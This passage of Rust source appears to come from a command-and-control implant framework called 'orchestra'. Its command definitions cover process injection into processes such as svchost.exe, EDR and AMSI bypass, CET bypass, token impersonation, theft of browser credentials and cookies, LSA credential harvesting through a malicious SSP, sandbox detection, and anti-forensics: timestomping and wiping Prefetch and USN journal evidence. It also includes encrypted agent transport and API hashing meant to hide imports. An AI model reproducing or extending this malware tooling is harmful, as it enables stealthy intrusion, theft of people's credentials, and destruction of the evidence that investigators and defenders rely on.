    /// falls back through the ranked technique list on failure.
    ///
    /// The technique string format is one of:
    ///   `"auto"` — auto-select (default)
    ///   `"ProcessHollow"`, `"ModuleStomp"`, `"EarlyBirdApc"`,
    ///   `"ThreadHijack"`, `"FiberInject"`, `"ContextOnly"`,
    ///   `"TransactedHollowing"`, `"DelayedModuleStomp"`,
    ///   `"ThreadPool"` — auto-variant thread pool injection
    ///   `"ThreadPool:Work"`, `"ThreadPool:Timer"`, etc. — specific variant
    ///   `"CallbackInjection"` — auto-API callback injection
    ///   `"CallbackInjection:EnumSystemLocalesA"`, etc. — specific API
    ///   `"SectionMapping"` — section mapping (auto exec method)
    ///   `"SectionMapping:Direct"` — section mapping with specific exec method
    ///   `"WaitingThreadHijack"` — waiting thread hijack
    ///   `"NtSetInfoProcess"` — NtSetInformationProcess write bypass
    ///
    /// Returns `InjectionResult` on success.
    UnifiedInject {
        /// Process name to inject into (e.g. `"svchost.exe"`).
        target_process: String,
        /// Shellcode or PE payload bytes.
        payload: Vec<u8>,
        /// Technique to use. `None` or `"auto"` = auto-select.
        #[serde(default)]
        technique: Option<String>,
        /// If true, use evasion-enhanced path with pre-injection
        /// reconnaissance (ETW check, EDR module detection, timing jitter).
        #[serde(default = "default_true")]
        evade: bool,
    },

    // ── Syscall emulation control (Windows only) ─────────────────────────

    /// Toggle user-mode NT kernel interface emulation at runtime.
    /// When enabled, the agent routes configured Nt* calls through
    /// kernel32/advapi32 equivalents instead of ntdll syscall stubs,
    /// making it invisible to EDR hooks on ntdll.  The change takes
    /// effect immediately for subsequent operations.
    SyscallEmulationToggle {
        /// `true` to enable emulation, `false` to disable (revert to
        /// indirect syscalls for all calls).
        enabled: bool,
    },

// ── CET / Shadow Stack bypass (Windows only) ─────────────────────────

    /// Query the current CET (Control-flow Enforcement Technology) /
    /// shadow-stack status on the agent host.  Returns a JSON object
    /// describing whether CET is present, enabled, and which bypass
    /// strategy is active.
    CetStatus,

// ── Token-only impersonation (Windows only) ──────────────────────────

    /// Create a named pipe and impersonate the security context of the
    /// first connecting client using token-only impersonation (avoids
    /// `ImpersonateNamedPipeClient` on the main thread).  The pipe is
    /// created with a randomised suffix if not provided.  Returns the
    /// pipe path and the impersonated user/domain on success.
    ImpersonatePipe {
        /// Named pipe path (e.g. `\\.\pipe\status`).  If empty, a random
        /// pipe name is generated.
        pipe_name: String,
    },
    /// Revert the current thread's impersonation token, restoring the
    /// original process security context.  Does NOT close cached tokens
    /// — call `ListTokens` to inspect and release cached entries.
    RevertToken,
    /// List all cached impersonation tokens with their source, user,
    /// domain, and SID.  Returns a JSON array of token metadata.
    ListTokens,

// ── Forensic cleanup — Prefetch evidence removal (Windows only) ──────

    /// Clean Windows Prefetch (.pf) evidence for the specified executable
    /// name.  If `exe_name` is empty, cleans all .pf files.  The cleanup
    /// method (delete, patch, disable-service) is determined by config.
    CleanPrefetch {
        /// Executable name to clean (e.g. "cmd.exe").  If empty, all .pf
        /// files are cleaned.
        exe_name: String,
    },
    /// Disable the Windows Prefetch service by setting the EnablePrefetcher
    /// registry value to 0.  Returns the original value for later restore.
    DisablePrefetch,
    /// Restore the Windows Prefetch service to its original state (sets
    /// EnablePrefetcher back to the value captured by `DisablePrefetch`).
    RestorePrefetch,

    /// Synchronise MFT timestamps ($SI + $FN) for the specified file to
    /// match the timestamps of a reference file.  Sets all 8 NTFS
    /// timestamps (4 in $STANDARD_INFORMATION + 4 in $FILE_NAME) to a
    /// consistent "cover time" to prevent forensic timeline analysis.
    Timestomp {
        /// Path to the file whose timestamps should be modified.
        file_path: String,
        /// Path to the reference file whose timestamps to copy.  If empty,
        /// uses the configured default reference file (typically ntdll.dll).
        reference_file: String,
    },
    /// Synchronise MFT timestamps for all files in a directory to match
    /// the timestamps of a reference file.  Recursively processes all
    /// files in the directory tree.
    TimestompDirectory {
        /// Path to the directory whose files should be timestamped.
        dir_path: String,
        /// Path to the reference file whose timestamps to copy.  If empty,
        /// uses the configured default reference file.
        reference_file: String,
    },
    /// Clean USN journal entries for a volume.  Removes entries that
    /// reference file modifications, preventing forensic timeline recovery
    /// of timestamp changes.
    CleanUsn {
        /// Volume path (e.g. "C:").  If empty, operates on the system volume.
        volume: String,
    },
    /// Synchronise timestamps for all recently modified files.  Scans for
    /// files modified within the current session and applies cover
    /// timestamps from the configured reference file.
    SyncTimestamps,

// ── Sandbox scoring (all platforms) ──────────────────────────────────

    /// Run a comprehensive sandbox/VM detection sweep and return the full
    /// indicator breakdown (category, detail, weight, source) together
    /// with the total score and the threshold used.  This gives operators
    /// a detailed report instead of just a boolean.
    SandboxCheck,

    /// Query the current state of the EDR bypass transform engine.
    /// Returns a structured JSON snapshot including last scan/transform
    /// counts, cumulative totals, skipped counter, and timestamp.
    EdrBypassStatus,

    /// Query the current state of the Evanesco page tracker subsystem.
    /// Returns full telemetry including page counts, timing, and
    /// encrypt/decrypt counters.  Requires operator-level access.
    PageTrackerStatus,

    /// Query a redacted version of page tracker state suitable for
    /// lower-privilege consumers.  Returns only page counts
    /// (total, encrypted, decrypted_rw, decoded_rx) with no timing
    /// data, no counters, and no thresholds.
    PageTrackerStatusRedacted,
}

/// AMSI bypass strategy selector.
///
/// Controls which bypass technique the agent uses to neutralise Anti-Malware
/// Scan Interface scanning.  Each strategy has different OPSEC tradeoffs:
///
/// - **WriteRaid**: Data-only race condition — overwrites the AMSI init-failed
///   flag in `.data` so all subsequent scans return `AMSI_RESULT_CLEAN`.
///   No code patches, no hardware breakpoints, no `VirtualProtect` calls.
///   **Most stealthy**; preferred when available.
/// - **Hwbp**: Hardware breakpoint on `AmsiScanBuffer` via DR0/DR1 + VEH.
///   No `.text` modification, but breakpoint registers are monitorable.
/// - **MemoryPatch**: In-process code patch (`xor eax,eax; ret`).  Detectable
///   via code integrity checks and `VirtualProtect` hooks.
/// - **Auto**: Select the best available strategy (WriteRaid > Hwbp > MemoryPatch).
#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum AmsiBypassMode {
    /// Hardware-breakpoint bypass via DR0/DR1 + VEH handler.
    Hwbp,
    /// In-process code patching of AmsiScanBuffer.
    MemoryPatch,
    /// Data-only race condition: overwrite AmsiInitFailed flag.
    WriteRaid,
    /// Automatically select the best available strategy.
    Auto,
}

/// Browser selector for the [`Command::BrowserData`] command.
#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum BrowserType {
    Chrome,
    Edge,
    Firefox,
    All,
}

/// Data category selector for the [`Command::BrowserData`] command.
#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum BrowserDataType {
    Credentials,
    Cookies,
    All,
}

/// LSA Whisperer method selector.
///
/// Controls how the LSA Whisperer extracts credentials from LSA authentication
/// packages.  Each method has different privilege requirements and OPSEC profiles:
///
/// - **Untrusted**: Uses `LsaConnectUntrusted` + `LsaCallAuthenticationPackage`
///   to query already-loaded SSPs (MSV1_0, Kerberos, WDigest).  No admin
///   privileges required — any process can connect to LSA.
/// - **SspInject**: Adds a custom SSP via registry that receives ALL
///   authentication events, including plaintext passwords during future logons.
///   Requires admin privileges.  Credentials are buffered in an encrypted ring.
/// - **Auto**: Try `SspInject` if the agent is elevated (or has a SYSTEM token),
///   else fall back to `Untrusted`.
#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum LsaMethod {
    /// Query already-loaded SSPs via LsaConnectUntrusted (no admin required).
    Untrusted,
    /// Inject a custom SSP to capture future authentication events (admin).
    SspInject,
    /// Automatically select the best available method.
    Auto,
}

/// Network discovery operation selector.
///
/// Each variant maps to a function in the `net_discovery` module and carries
/// the parameters the operator must supply.  The feature is gated behind
/// `network-discovery`; when that feature is not enabled the agent returns
/// an error at dispatch time.
#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum NetDiscoveryOp {
    /// Read the local ARP cache (`arp_scan`).
    ArpScan,
    /// TCP-probe a subnet for live hosts (`ping_sweep`).
    PingSweep {
        /// CIDR (e.g. `"192.168.1.0/24"`) or 3-octet prefix (`"192.168.1"`).
        subnet: String,
        /// Per-host TCP connect timeout in milliseconds.
        #[serde(default = "default_timeout_ms")]
        timeout_ms: u64,
        /// Maximum number of in-flight probes.
        #[serde(default = "default_max_concurrent")]
        max_concurrent: usize,
    },
    /// Scan a single host for open TCP ports (`tcp_port_scan`).
    TcpPortScan {
        /// Target host IP address.
        host: String,
        /// Port list to scan.
        ports: Vec<u16>,
        /// Maximum number of concurrent connection attempts.
        #[serde(default = "default_scan_concurrency")]
        concurrency: usize,
        /// Per-port TCP connect timeout in milliseconds.
        #[serde(default = "default_timeout_ms")]
        timeout_ms: u64,
    },
    /// Resolve the reverse DNS (PTR) name for an IP (`reverse_dns_lookup`).
    ReverseDns {
        /// IP address to look up.
        ip: String,
    },
    /// Enumerate Active Directory SRV records (`ad_srv_discovery`).
    AdSrvDiscovery {
        /// Domain to query (e.g. `"corp.example.com"`).
        domain: String,
    },
}

fn default_timeout_ms() -> u64 {
    3000
}
fn default_max_concurrent() -> usize {
    64
}
fn default_scan_concurrency() -> usize {
    128
}

/// Errors produced by [`CryptoSession`].
#[derive(Debug, Error)]
pub enum CryptoError {
    #[error("ciphertext is too short to contain a nonce")]
    Truncated,
    #[error("AES-GCM authentication failed")]
    AuthenticationFailed,
}

/// AES-256-GCM symmetric session keyed from a pre-shared secret.
///
/// # Forward Secrecy Upgrade Plan (Roadmap to X25519 + HKDF)
///
/// Currently, `CryptoSession` derives a static symmetric key via HKDF from a pre-shared
/// secret. This provides no forward secrecy: if the PSK is compromised, all past traffic
/// can be decrypted. We will transition to an Ephemeral Diffie-Hellman (X25519) key exchange.
///
/// ## Transition Plan & Backward Compatibility
///
/// 1. **Protocol Negotiation / Versioning:**
///    - Introduce a new handshake message or a version flag in the initial connection.
///    - Clients capable of Forward Secrecy will send an `X25519` key share in their first
///      message.
///    - Legacy clients will simply send data encrypted under the current static PSK.
///
/// 2. **Authentication via PSK:**
///    - To prevent Man-In-The-Middle (MITM) attacks during the DH exchange, the static
///      PSK will be repurposed as a MAC/signature key (or injected into the HKDF
///      extractor) to mutually authenticate the ephemeral `X25519` public keys before
///      deriving the final session keys.
///
/// 3. **HKDF Key Derivation:**
///    - The new session key will be derived as:
///      `HKDF(IKM = DH_shared_secret, salt = random_nonce, info = PSK)`
///    - This binds the X25519 ephemeral exchange to the trusted identity.
///
/// 4. **Deprecation Phases:**
///    - **Phase 1 (Dual Support):** Servers support both static AES-GCM (legacy) and
///      X25519 ephemeral (modern) to allow seamless agent upgrades.
///    - **Phase 2 (Warning):** Connections using the old static scheme log a security
///      warning and require a specific `--allow-legacy-crypto` flag.
///    - **Phase 3 (Removal):** Static PSK code paths are entirely dropped, and the PSK
///      is used exclusively for authenticating the ephemeral DH exchange.
/// Number of encrypt/decrypt operations after which the session key is
/// automatically re-derived from the PSK to limit the amount of ciphertext
/// an attacker can collect under a single key.
const REKEY_INTERVAL: u64 = 10_000;

// ── LockedSecret: mlock-protected, zeroizing secret wrapper ──────────────────

// P0-12: Runtime-resolved VirtualLock/VirtualUnlock to avoid static IAT entries.
#[cfg(windows)]
mod virtual_lock {
    use std::sync::OnceLock;

    type FnVirtualLock = unsafe extern "system" fn(*const u8, usize) -> i32;
    type FnVirtualUnlock = unsafe extern "system" fn(*const u8, usize) -> i32;

    static VIRTUAL_LOCK: OnceLock<Option<FnVirtualLock>> = OnceLock::new();
    static VIRTUAL_UNLOCK: OnceLock<Option<FnVirtualUnlock>> = OnceLock::new();

    fn resolve_fn<T>(name: &[u8]) -> Option<T> {
        unsafe {
            let module = pe_resolve::get_module_handle_by_hash(
                pe_resolve::HASH_KERNEL32_DLL,
            )?;
            let name_hash = pe_resolve::hash_str(name);
            let proc = pe_resolve::get_proc_address_by_hash(module, name_hash)?;
            Some(std::mem::transmute_copy(&proc))
        }
    }

    pub unsafe fn virtual_lock(ptr: *const u8, len: usize) -> i32 {
        let f = VIRTUAL_LOCK.get_or_init(|| resolve_fn(b"VirtualLock\0"));
        match f {
            Some(f) => f(ptr, len),
            None => 0,
        }
    }

    pub unsafe fn virtual_unlock(ptr: *const u8, len: usize) -> i32 {
        let f = VIRTUAL_UNLOCK.get_or_init(|| resolve_fn(b"VirtualUnlock\0"));
        match f {
            Some(f) => f(ptr, len),
            None => 0,
        }
    }
}

/// Wrapper that keeps a secret byte buffer locked in RAM (`mlock` / `VirtualLock`)
/// and zeroizes it on drop so it never ends up in swap or core dumps.
///
/// On Unix the buffer is pinned with `mlock(2)`.  On Windows we fall back to
/// `VirtualLock` when available; otherwise the zeroization still takes effect.
pub struct LockedSecret {
    data: Vec<u8>,
}

impl LockedSecret {
    /// Create a new `LockedSecret` from a byte slice, immediately locking it
    /// in physical RAM.
    pub fn new(data: &[u8]) -> Self {
        let s = Self { data: data.to_vec() };
        s.lock_memory();
        s
    }

    /// Return a reference to the raw secret bytes.
    pub fn as_bytes(&self) -> &[u8] {
        &self.data
    }

    /// Lock the backing memory so the OS will not page it to swap.
    fn lock_memory(&self) {
        let ptr = self.data.as_ptr() as *const u8;
        let len = self.data.len();
        // Best-effort — failure to lock is logged but not fatal.
        #[cfg(unix)]
        unsafe {
            if libc::mlock(ptr as *const _, len) != 0 {
                log::warn!("LockedSecret: mlock({} bytes) failed", len);
            }
        }
        #[cfg(windows)]
        unsafe {
            if virtual_lock::virtual_lock(ptr, len) == 0 {
                log::warn!("LockedSecret: VirtualLock({} bytes) failed", len);
            }
        }
    }

    /// Unlock the backing memory (called from Drop).
    fn unlock_memory(&self) {
        let ptr = self.data.as_ptr() as *const u8;
        let len = self.data.len();
        #[cfg(unix)]
        unsafe {
            libc::munlock(ptr as *const _, len);
        }
        #[cfg(windows)]
        unsafe {
            virtual_lock::virtual_unlock(ptr, len);
        }
    }
}

impl Drop for LockedSecret {
    fn drop(&mut self) {
        // Zeroize before unlocking.
        self.data.zeroize();
        self.unlock_memory();
    }
}

/// Overwrite a byte slice with zeros using volatile writes.
///
/// Prevents the compiler from optimizing away the zeroing.
/// Shared across crates so that modules (lsass_harvest, browser_data, etc.)
/// don't each implement their own copy.
pub fn secure_zero(slice: &mut [u8]) {
    for byte in slice.iter_mut() {
        unsafe { std::ptr::write_volatile(byte, 0) };
    }
    std::sync::atomic::compiler_fence(std::sync::atomic::Ordering::SeqCst);
}

/// Zeroize a `String` in place by overwriting its heap buffer with zeros.
///
/// The string is left in an unusable state (all zeros, length unchanged).
/// Intended for clearing sensitive credential values after serialization.
pub fn secure_zero_string(s: &mut String) {
    unsafe {
        let vec = s.as_mut_vec();
        secure_zero(vec);
    }
}

/// Owning wrapper that zeroizes key material on drop.
///
/// Unlike [`LockedSecret`] this does **not** lock pages in RAM (no mlock /
/// VirtualLock).  Use this for short-lived session keys where the overhead
/// of page-locking is not justified — e.g. a Chromium master key that lives
/// for the duration of a single cookie-harvest operation.
pub struct SecureKey {
    data: Vec<u8>,
}

impl SecureKey {
    /// Create a `SecureKey` by taking ownership of an existing `Vec<u8>`.
    ///
    /// The caller should discard any other copies of the key material
    /// after calling this — the value is *moved*, not copied.
    pub fn from_vec(v: Vec<u8>) -> Self {
        Self { data: v }
    }

    /// Borrow the raw key bytes.
    pub fn as_bytes(&self) -> &[u8] {
        &self.data
    }
}

impl Drop for SecureKey {
    fn drop(&mut self) {
        secure_zero(&mut self.data);
    }
}

/// RAII buffer that zeroizes its contents on drop.
///
/// Use this for any temporary buffer that holds sensitive data (credentials,
/// memory dumps, key material, etc.) to guarantee zeroization on **all**
/// exit paths — including early returns and `?` propagation — without
/// relying on manual `secure_zero()` calls at every return site.
///
/// Unlike [`SecureKey`] (fixed-length key wrapper) and [`LockedSecret`]
/// (mlock-protected), this is a general-purpose growable buffer with no
/// page-locking overhead.
pub struct SecureBuffer {
    data: Vec<u8>,
}

impl SecureBuffer {
    /// Allocate a zero-filled buffer of `size` bytes.
    pub fn new(size: usize) -> Self {
        Self {
            data: vec![0u8; size],
        }
    }

    /// Borrow the buffer contents as a mutable slice.
    pub fn as_mut_slice(&mut self) -> &mut [u8] {
        &mut self.data
    }

    /// Borrow the buffer contents as an immutable slice.
    pub fn as_slice(&self) -> &[u8] {
        &self.data
    }

    /// Return the current length of the buffer.
    pub fn len(&self) -> usize {
        self.data.len()
    }

    /// Returns `true` if the buffer is empty.
    pub fn is_empty(&self) -> bool {
        self.data.is_empty()
    }

    /// Truncate the buffer to `new_len` bytes.
    ///
    /// If `new_len` is greater than the current length, this is a no-op.
    pub fn truncate(&mut self, new_len: usize) {
        self.data.truncate(new_len);
    }

    /// Return a raw pointer to the buffer's allocation.
    pub fn as_mut_ptr(&mut self) -> *mut u8 {
        self.data.as_mut_ptr()
    }

    /// Return a raw const pointer to the buffer's allocation.
    pub fn as_ptr(&self) -> *const u8 {
        self.data.as_ptr()
    }
}

impl Drop for SecureBuffer {
    fn drop(&mut self) {
        secure_zero(&mut self.data);
    }
}

impl std::ops::Deref for SecureBuffer {
    type Target = [u8];
    fn deref(&self) -> &[u8] {
        &self.data
    }
}

impl std::ops::DerefMut for SecureBuffer {
    fn deref_mut(&mut self) -> &mut [u8] {
        &mut self.data
    }
}

pub struct CryptoSession {
    /// Cipher and key protected by a write-lock for periodic re-keying.
    inner: std::sync::RwLock<CryptoInner>,
    /// HKDF salt associated with this session.
    salt: std::sync::RwLock<[u8; SALT_LEN]>,
    /// Optional pre-shared secret used to derive per-message keys from wire salts.
    /// Wrapped in `LockedSecret` for mlock + zeroize-on-drop protection.
    pre_shared_secret: Option<LockedSecret>,
    /// Monotonic counter of encrypt + decrypt operations; triggers re-keying
    /// every [`REKEY_INTERVAL`] operations.
    op_counter: std::sync::atomic::AtomicU64,
}

/// Mutable inner state of a [`CryptoSession`], protected by an `RwLock`.
struct CryptoInner {
    cipher: Aes256Gcm,
    /// Copy of the raw key bytes, zeroed on drop / re-key.
    key: [u8; KEY_LEN],
    /// P2-12: Counter-based nonce — 4-byte random prefix, 8-byte monotonic counter.
    /// Guarantees nonce uniqueness without relying on per-message randomness.
    nonce_prefix: [u8; 4],
    nonce_counter: u64,
    /// P2-09: Whether the key memory has been locked via mlock/VirtualLock.
    key_locked: bool,
}

impl CryptoInner {
    /// Lock the key bytes in physical RAM (best-effort, non-fatal on failure).
    fn lock_key_memory(&mut self) {
        let ptr = self.key.as_ptr() as *const u8;
        let len = self.key.len();
        #[cfg(unix)]
        unsafe {
            if libc::mlock(ptr as *const _, len) != 0 {
                log::warn!("CryptoInner: mlock(key, {} bytes) failed", len);
            } else {
                self.key_locked = true;
            }
        }
        #[cfg(windows)]
        unsafe {
            if virtual_lock::virtual_lock(ptr, len) != 0 {
                self.key_locked = true;
            } else {
                log::warn!("CryptoInner: VirtualLock(key, {} bytes) failed", len);
            }
        }
        #[cfg(not(any(unix, windows)))]
        {
            let _ = (ptr, len);
        }
    }

    /// Unlock the key bytes (called during zeroize/re-key).
    fn unlock_key_memory(&mut self) {
        if !self.key_locked {
            return;
        }
        let ptr = self.key.as_ptr() as *const u8;
        let len = self.key.len();
        #[cfg(unix)]
        unsafe {
            libc::munlock(ptr as *const _, len);
        }
        #[cfg(windows)]
        unsafe {
            virtual_lock::virtual_unlock(ptr, len);
        }
        self.key_locked = false;
    }

    /// P2-12: Generate the next nonce as `prefix || counter.to_be_bytes()`.
    fn next_nonce(&mut self) -> [u8; NONCE_LEN] {
        let mut nonce = [0u8; NONCE_LEN];
        nonce[..4].copy_from_slice(&self.nonce_prefix);
        nonce[4..].copy_from_slice(&self.nonce_counter.to_be_bytes());
        self.nonce_counter = self.nonce_counter.wrapping_add(1);
        nonce
    }
}

impl Drop for CryptoSession {
    fn drop(&mut self) {
        // Zeroize the key inside the RwLock and unlock it.
        if let Ok(inner) = self.inner.get_mut() {
            inner.unlock_key_memory();
            inner.key.zeroize();
        }
        // `pre_shared_secret` (LockedSecret) zeroizes itself via its own Drop.
    }
}

impl CryptoSession {
    fn derive_key_bytes(pre_shared_secret: &[u8], salt: &[u8]) -> [u8; KEY_LEN] {
        let hk = hkdf::Hkdf::<Sha256>::new(Some(salt), pre_shared_secret);
        let mut key_bytes = [0u8; KEY_LEN];
        hk.expand(b"orchestra-aes-gcm", &mut key_bytes)
            .expect("HKDF-SHA256 expand must succeed");
        key_bytes
    }

    fn decrypt_nonce_prefixed(cipher: &Aes256Gcm, ciphertext: &[u8]) -> Result<Vec<u8>, CryptoError> {
        if ciphertext.len() < NONCE_LEN {
            return Err(CryptoError::Truncated);
        }
        let (nonce_bytes, body) = ciphertext.split_at(NONCE_LEN);
        let nonce = Nonce::from_slice(nonce_bytes);
        cipher
            .decrypt(nonce, body)
            .map_err(|_| CryptoError::AuthenticationFailed)
    }

    /// Build a session from a pre-shared secret using HKDF-SHA256 and a random
    /// per-session salt.
    pub fn from_shared_secret(pre_shared_secret: &[u8]) -> Self {
        let mut salt = [0u8; SALT_LEN];
        rand::thread_rng().fill_bytes(&mut salt);
        Self::from_shared_secret_with_salt(pre_shared_secret, &salt)
    }

    /// Build a session from a pre-shared secret and an explicit HKDF salt.
    pub fn from_shared_secret_with_salt(pre_shared_secret: &[u8], salt: &[u8]) -> Self {
        let key_bytes = Self::derive_key_bytes(pre_shared_secret, salt);
        let key = Key::<Aes256Gcm>::from_slice(&key_bytes);

        let mut salt_bytes = [0u8; SALT_LEN];
        let copy_len = salt.len().min(SALT_LEN);
        salt_bytes[..copy_len].copy_from_slice(&salt[..copy_len]);

        // P2-12: Generate a random 4-byte nonce prefix for counter-based nonces.
        let mut nonce_prefix = [0u8; 4];
        rand::thread_rng().fill_bytes(&mut nonce_prefix);

        let mut inner = CryptoInner {
            cipher: Aes256Gcm::new(key),
            key: key_bytes,
            nonce_prefix,
            nonce_counter: 0,
            key_locked: false,
        };
        // P2-09: Lock the key memory.
        inner.lock_key_memory();

        Self {
            inner: std::sync::RwLock::new(inner),
            salt: std::sync::RwLock::new(salt_bytes),
            pre_shared_secret: Some(LockedSecret::new(pre_shared_secret)),
            op_counter: std::sync::atomic::AtomicU64::new(0),
        }
    }

    /// Build a session directly from a 32-byte key.
    pub fn from_key(key_bytes: [u8; KEY_LEN]) -> Self {
        let key = Key::<Aes256Gcm>::from_slice(&key_bytes);
        let mut salt = [0u8; SALT_LEN];
        rand::thread_rng().fill_bytes(&mut salt);
        // P2-12: Generate a random 4-byte nonce prefix.
        let mut nonce_prefix = [0u8; 4];
        rand::thread_rng().fill_bytes(&mut nonce_prefix);

        let mut inner = CryptoInner {
            cipher: Aes256Gcm::new(key),
            key: key_bytes,
            nonce_prefix,
            nonce_counter: 0,
            key_locked: false,
        };
        // P2-09: Lock the key memory.
        inner.lock_key_memory();

        Self {
            inner: std::sync::RwLock::new(inner),
            salt: std::sync::RwLock::new(salt),
            pre_shared_secret: None,
            op_counter: std::sync::atomic::AtomicU64::new(0),
        }
    }

    /// Check the operation counter and re-derive the session key if the
    /// [`REKEY_INTERVAL`] has been reached.  This limits the amount of
    /// ciphertext produced under a single key.
    ///
    /// Uses a compare-exchange to ensure only one thread performs the re-key;
    /// others continue with the current key until the next interval.
    fn maybe_rekey(&self) {
        use std::sync::atomic::Ordering;
        let prev = self.op_counter.fetch_add(1, Ordering::Relaxed);
        // Re-key every REKEY_INTERVAL operations, but not on the very first
        // call (prev == 0) because the session was just created.
        if prev == 0 || prev % REKEY_INTERVAL != 0 {
            return;
        }

        // Re-derive key from PSK + fresh random salt.
        let psk = match self.pre_shared_secret.as_ref() {
            Some(p) => p,
            None => return, // from_key sessions have no PSK to re-derive from
        };

        let mut new_salt = [0u8; SALT_LEN];
        rand::thread_rng().fill_bytes(&mut new_salt);
        let new_key_bytes = Self::derive_key_bytes(psk.as_bytes(), &new_salt);
        let new_key = Key::<Aes256Gcm>::from_slice(&new_key_bytes);

        // Update under write lock — unlock + zeroize old key first.
        {
            let mut inner = self.inner.write().unwrap();
            inner.unlock_key_memory();
            inner.key.zeroize();
            inner.key = new_key_bytes;
            inner.cipher = Aes256Gcm::new(new_key);
            // P2-12: Reset nonce counter on re-key to avoid wrapping.
            let mut new_prefix = [0u8; 4];
            rand::thread_rng().fill_bytes(&mut new_prefix);
            inner.nonce_prefix = new_prefix;
            inner.nonce_counter = 0;
            // P2-09: Lock the new key.
            inner.lock_key_memory();
        }
        {
            let mut salt = self.salt.write().unwrap();
            *salt = new_salt;
        }
    }

    /// Return a copy of the raw 32-byte AES-256-GCM key.
    ///
    /// Intended for registering the key with the memory-guard subsystem so it
    /// is encrypted while the agent is idle.  Prefer calling
    /// `memory_guard::register_session_key` rather than reading these bytes
    /// directly.
    pub fn key_bytes(&self) -> [u8; KEY_LEN] {
        self.inner.read().unwrap().key
    }

    /// Encrypt `plaintext` and return `salt || nonce || ciphertext_with_tag`.
    ///
    /// P2-12: Uses counter-based nonces (4-byte random prefix + 8-byte counter)
    /// instead of random nonces, providing stronger uniqueness guarantees.
    pub fn encrypt(&self, plaintext: &[u8]) -> Vec<u8> {
        self.maybe_rekey();
        // Write lock needed to increment the nonce counter.
        let mut inner = self.inner.write().unwrap();
        let salt = self.salt.read().unwrap();

        let nonce_bytes = inner.next_nonce();
        let nonce = Nonce::from_slice(&nonce_bytes);
        let ciphertext = inner
            .cipher
            .encrypt(nonce, plaintext)
            .expect("AES-GCM encryption is infallible for valid inputs");

        let mut out = Vec::with_capacity(SALT_LEN + NONCE_LEN + ciphertext.len());
        out.extend_from_slice(&*salt);
        out.extend_from_slice(&nonce_bytes);
        out.extend_from_slice(&ciphertext);
        out
    }

    /// Decrypt a nonce-prefixed buffer (`nonce || ciphertext_with_tag`).
    ///
    /// This method assumes `self` was already built with the correct key/salt
    /// context. Callers receiving full wire-format payloads prefixed with salt
    /// SHOULD use [`Self::decrypt_with_psk`].
    pub fn decrypt(&self, ciphertext: &[u8]) -> Result<Vec<u8>, CryptoError> {
        self.maybe_rekey();

        // New format: salt || nonce || ciphertext_with_tag.
        // Try this path first for backward compatibility with existing callers
        // that pass encrypt() output directly to decrypt().
        if ciphertext.len() >= SALT_LEN + NONCE_LEN {
            let (salt, rest) = ciphertext.split_at(SALT_LEN);

            // If this session was created from a PSK, derive the per-message
            // key from the embedded salt so independently-created sessions
            // sharing the same PSK can still interoperate.
            if let Some(psk) = self.pre_shared_secret.as_ref() {
                let key_bytes = Self::derive_key_bytes(psk.as_bytes(), salt);
                let key = Key::<Aes256Gcm>::from_slice(&key_bytes);
                let cipher = Aes256Gcm::new(key);
                if let Ok(plain) = Self::decrypt_nonce_prefixed(&cipher, rest) {
                    return Ok(plain);
                }
            } else {
                let inner = self.inner.read().unwrap();
                if let Ok(plain) = Self::decrypt_nonce_prefixed(&inner.cipher, rest) {
                    // from_key sessions don't have a PSK; fall back to decrypting
                    // the salt-stripped payload with the session key.
                    return Ok(plain);
                }
            }
        }

        // Legacy format: nonce || ciphertext_with_tag.
        let inner = self.inner.read().unwrap();
        Self::decrypt_nonce_prefixed(&inner.cipher, ciphertext)
    }

    /// Decrypt a full wire-format message produced by [`Self::encrypt`]:
    /// `salt || nonce || ciphertext_with_tag`.
    pub fn decrypt_with_psk(psk: &[u8], wire_data: &[u8]) -> Result<Vec<u8>, CryptoError> {
        if wire_data.len() < SALT_LEN + NONCE_LEN {
            return Err(CryptoError::Truncated);
        }
        let (salt, rest) = wire_data.split_at(SALT_LEN);
        let session = Self::from_shared_secret_with_salt(psk, salt);
        session.decrypt(rest)
    }
}

pub mod transport;

/// Async transport abstraction over which framed [`Message`]s are exchanged.
///
/// Concrete implementations (TCP+TLS, QUIC, in-memory test harness) live in
/// downstream crates.
#[async_trait::async_trait]
pub trait Transport: Send {
    async fn send(&mut self, msg: Message) -> anyhow::Result<()>;
    async fn recv(&mut self) -> anyhow::Result<Message>;
}

/// Blanket impl so that `Box<dyn Transport + Send>` can itself be used as a `Transport`.
#[async_trait::async_trait]
impl<T: Transport + ?Sized + Send> Transport for Box<T> {
    async fn send(&mut self, msg: Message) -> anyhow::Result<()> {
        (**self).send(msg).await
    }
    async fn recv(&mut self) -> anyhow::Result<Message> {
        (**self).recv().await
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn encrypt_decrypt_roundtrip() {
        let psk = b"orchestra-dev-secret";
        let session = CryptoSession::from_shared_secret(psk);
        let plaintext = b"hello orchestra";
        let ct = session.encrypt(plaintext);
        assert!(ct.len() > SALT_LEN + NONCE_LEN);
        let pt = CryptoSession::decrypt_with_psk(psk, &ct).expect("decrypt");
        assert_eq!(pt, plaintext);
    }

    #[test]
    fn nonces_are_unique_per_encryption() {
        let a = CryptoSession::from_shared_secret(b"k").encrypt(b"same");
        let b = CryptoSession::from_shared_secret(b"k").encrypt(b"same");
        assert_ne!(a[..SALT_LEN], b[..SALT_LEN]);
        assert_ne!(a[SALT_LEN..SALT_LEN + NONCE_LEN], b[SALT_LEN..SALT_LEN + NONCE_LEN]);
        assert_ne!(a, b);
    }

    #[test]
    fn tampered_ciphertext_is_rejected() {
        let psk = b"k";
        let session = CryptoSession::from_shared_secret(psk);
        let mut ct = session.encrypt(b"payload");
        let mut idx = SALT_LEN + NONCE_LEN;
        if idx >= ct.len() {
            idx = ct.len() - 1;
        }
        ct[idx] ^= 0x01;
        let err = CryptoSession::decrypt_with_psk(psk, &ct).unwrap_err();
        assert!(matches!(err, CryptoError::AuthenticationFailed));
    }

    #[test]
    fn truncated_ciphertext_is_rejected() {
        let session = CryptoSession::from_shared_secret(b"k");
        let err = session.decrypt(&[0u8; NONCE_LEN - 1]).unwrap_err();
        assert!(matches!(err, CryptoError::Truncated));
    }

    #[test]
